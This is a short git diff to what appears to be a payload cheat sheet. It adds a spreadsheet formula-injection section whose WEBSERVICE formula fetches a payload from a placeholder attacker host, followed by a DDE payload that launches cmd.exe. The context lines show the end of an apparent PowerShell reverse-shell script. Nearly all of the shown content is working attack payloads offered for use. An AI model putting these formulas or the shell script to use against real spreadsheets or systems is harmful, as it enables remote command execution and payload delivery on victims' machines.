@@ -95,3 +95,12 @@ $stream.Write($encoding.GetBytes($out),0,$out.length)
 $out = $null
 $string = $null}} else {cleanup}}
 ```
+
+Download payload using WEBSERVICE formula
+------------------------------------------------
+```
+# Use for Injection
+=WEBSERVICE("http://www.attacker.com/payload.txt"
+# Payload looks like this
+=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc.exe'!''
+```
